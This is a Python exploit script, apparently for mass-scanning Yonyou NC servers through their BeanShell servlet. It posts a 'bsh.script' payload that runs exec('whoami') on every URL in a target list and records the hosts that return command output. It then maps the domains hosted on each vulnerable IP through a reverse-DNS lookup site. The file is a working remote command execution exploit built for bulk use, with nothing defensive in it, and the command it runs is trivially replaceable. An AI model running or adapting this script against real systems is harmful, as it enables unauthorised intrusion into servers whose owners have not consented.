# coding='utf-8'
# author: A1andNS
import requests
import re
from bs4 import BeautifulSoup
import time

vul_url = open("vul_url.txt", "w")
ip_reverse_result = open("ip_reverse_result.txt", "w")


def get_ip_finished():
    f2 = open("ip_finish.txt","r")
    lines = f2.readlines()
    ip_finish_list = []
    for line in lines:
        line = line.strip()
        ip_finish_list.append(line)
    f2.close()
    return ip_finish_list


def get_ip():
    f = open("ip.txt", "r") # ip格式为 http://192.168.2.2:8090/
    lines = f.readlines()
    ip_list = []
    for line in lines:
        line = line.strip()
        #pattern = re.compile(r':[0-9]+')
        #if pattern.search(line):
        #line = line.replace("https", "http")
        ip_list.append(line)
    f.close()
    return ip_list


def poc(ips,ipfs):
    cmd = "whoami"  # command
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'
    }
    payload = {
        "bsh.script": 'exec("'+cmd+'")'
    }
    for ip in ips:
        if ip not in ipfs:
            url = ip + "servlet/~ic/bsh.servlet.BshServlet"
            try:
                r = requests.post(url=url, data=payload, headers=headers, timeout=3)
                if "抱歉，您请求的页面出错啦！" in r.text:
                    print(url+" 失败")
                    pass
                else:
                    html = BeautifulSoup(r.content, "html.parser")
                    pre = html.find_all("pre")
                    if pre[0].text:
                        print(url+" "+pre[0].text.strip())
                        vul_url.write(url+" "+pre[0].text.strip()+"\n")
            except:
                url = url.replace("https","http")
                try:
                    r = requests.post(url=url, data=payload, headers=headers, timeout=3)
                    if "抱歉，您请求的页面出错啦！" in r.text:
                        print(url+" 失败")
                        pass
                    else:
                        html = BeautifulSoup(r.content, "html.parser")
                        pre = html.find_all("pre")
                        if pre[0].text:
                            print(url+" "+pre[0].text.strip())
                            vul_url.write(url+" "+pre[0].text.strip()+"\n")
                except:
                    print(url + "无法访问")
                    pass
        else:
            print(ip+" 已测试的重复项")
            pass
    vul_url.close()


def search_ip(url):
    pattern = re.compile(r'[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}')
    ip = pattern.findall(url)
    try:
        return ip[0]
    except:
        return ""

def get_ip_reverse():
    f = open("vul_url.txt","r")
    lines = f.readlines()
    for line in lines:
        line = line.strip()
        line_ls = line.split(" ")
        url = line_ls[0]
        ip = search_ip(url)
        if ip != "":
            aizhan_reverse(ip)
    ip_reverse_result.close()

def aizhan_reverse(ip):
    result = ip + " =>"
    url = "https://dns.aizhan.com/" + ip + "/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'
    }
    try:
        # print(url)
        r = requests.get(url=url, headers=headers, timeout=3)
        soup = BeautifulSoup(r.content,"html.parser")
        # print(soup)
        td = soup.find_all(name="td", attrs={"class" :"domain"})
        for i in td[1:len(td)-1]:
            a = i.a
            result += " " + str(a['href'])
        print(result)
        ip_reverse_result.write(result+"\n")
        time.sleep(2)
    except Exception as e:
        print(e)
        print(ip+" 发生错误")


def test():
    print(requests.get("https://www.8684.cn/ip").text)


if __name__ == "__main__":
    ip_ls = get_ip()
    ip_fls = get_ip_finished()
    poc(ip_ls,ip_fls)
    get_ip_reverse()
    # print(ip_fls)
    # test()
